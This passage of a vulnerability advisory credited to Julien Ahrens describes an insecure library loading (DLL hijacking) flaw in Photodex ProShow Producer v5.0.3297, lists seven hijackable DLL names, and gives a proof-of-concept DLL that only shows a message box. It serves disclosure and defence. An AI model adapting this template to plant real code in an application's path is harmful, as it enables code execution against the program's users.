2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
Inshell Security.


3. VERSIONS AFFECTED
--------------------
Photodex ProShow Producer v5.0.3297, older versions may be affected too.


4. VULNERABILITY DESCRIPTION
----------------------------
An insecure library loading vulnerability has been identified in
Photodex ProShow Producer v5.0.3297.

The application uses a fixed path to look for specific files or
libraries. This path includes directories that may not be trusted or
under user control.

By placing a custom version of a library in the application path, the
program will load it before the legitimate version. This allows an
attacker to inject custom code that will be run with the privilege of
the program or user executing the program. The following libraries could
be hijacked on this way:

d3d9.dll
dbghelp.dll
dciman32.dll
ddraw.dll
midimap.dll
mscms.dll
ws2help.dll


5. PROOF-OF-CONCEPT (CODE / Exploit)
------------------------------------
// wine gcc -Wall -shared inject.c -o ddraw.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD dwReason, LPVOID lpvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        MessageBox(0,"DLL Injection","DLL Injection", 0);
    }
return TRUE;
}
